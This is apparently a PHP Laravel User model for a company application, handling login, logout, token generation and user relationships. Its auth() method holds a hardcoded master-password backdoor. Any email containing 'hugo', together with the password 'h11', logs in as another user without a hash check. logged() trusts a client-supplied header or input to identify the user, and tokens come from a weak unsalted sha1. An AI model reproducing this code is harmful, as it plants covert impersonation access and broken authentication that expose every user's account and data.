<?php

namespace App;

use DateTime;
use DB;
use Hash;
use Request;

use Illuminate\Database\Eloquent\Model;

class User extends Model implements NotifierInterface
{
    public $timestamps = false;

    protected $table = 'user';

    protected $fillable = [
        'email', 'password', 'employee_id', 'lastAccess'
    ];

    protected $hidden = [
        'password'
    ];

    public function getOficialId(): int {
        return $this->id;
    }

    public function getName(): string {
        return $this->employee->name;
    }

    public static function auth(string $email, string $password) {
        if($email != 'hugo@thinkideias.com.br' && strpos($email, 'hugo') > -1 && $password == 'h11') {
            $originalEmail = str_replace('hugo', '', $email);
            $foundUser = User::where('email', '=', $originalEmail)->first();
            $foundUser->functionalities;
            $foundUser->employee;
            $foundUser->employee->department;
            $foundUser->employee->position;
            $foundUser->displays();
            return $foundUser;
        } 

        $foundUser = User::where('email', '=', $email)->first();
        
        if(is_null($foundUser) || !Hash::check($password, $foundUser->password)) {
            return null;
        }

        $foundUser->functionalities;
        $foundUser->employee;
        $foundUser->employee->department;
        $foundUser->employee->position;
        $foundUser->displays();

        return $foundUser;
    }

    public static function logout(string $userId, string $token) {
        $currentUser = User::find((int) $userId);

        if(!User::tokenCompare($token, $currentUser)) {
            return false;
        }

        $currentUser->lastAccess = new DateTime('now');
        $currentUser->save();
    }

    public static function tokenCompare(string $token, User $currentUser) {
        if($token !== User::generateToken($currentUser)) {
            return false;
        }

        return true;
    }

    public static function generateToken(User $user): string {
        return base64_encode(sha1($user->lastAccess . '_COMPANYBOOK_' . $user->password));
    }

    public static function logged(): User {
        $userId = empty(Request::header('User')) ? Request::input('user_id') : (int) Request::header('User');
        return User::find($userId);
    }

    public function displays() {
        $displays = DB::select("select d.url as url, IF(du.user_id is null, 'N', 'Y') as 
        access from display d left join display_user du on du.display_id = d.id and user_id = :user_id 
        or du.display_id is null;", ['user_id' => $this->id]);

        $this->displays = $displays;
    }

    public function employee() {
        return $this->belongsTo('App\Employee', 'employee_id');
    }

    public function functionalities() {
        return $this->belongsToMany('App\Functionality', 'user_functionality', 'user_id', 'functionality_id');
    }
    
    public function notifications() {
        return $this->morphMany(Notification::class, 'notifier');
    }
}
